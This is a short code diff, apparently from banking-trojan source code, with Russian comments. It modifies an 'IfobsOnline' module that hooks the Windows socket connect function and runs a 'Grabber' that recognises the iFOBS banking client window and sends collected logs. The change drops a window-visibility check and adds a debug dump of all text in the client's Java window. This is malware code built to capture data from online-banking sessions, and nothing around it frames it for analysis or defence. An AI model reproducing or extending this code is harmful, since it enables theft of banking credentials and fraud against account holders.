@@ -64,9 +64,6 @@ namespace IfobsOnline
 	// Функция обработки сообщения
 	int WINAPI Hook_Connect(SOCKET s, const struct sockaddr *name, int namelen )
 	{
-		if (!IsWindowVisible(AppletWnd))
-			AppletWnd = NULL;
-
 		if (Grabber)
 		{
 			if (Grabber->SendLog())
@@ -107,6 +104,8 @@ namespace IfobsOnline
 		if (!Grabber->IsIfobs())
 		{
 			// Окно не является окном ИФобс
+			PCHAR T = GetAllWindowsText(JafaFrameWnd, true, true);
+			IFODBG("IfobsOnline", "Окно не является ифобсом \r\n%s\r\n---------------", T);
 			delete Grabber;
 			Grabber = NULL;
 			return false;
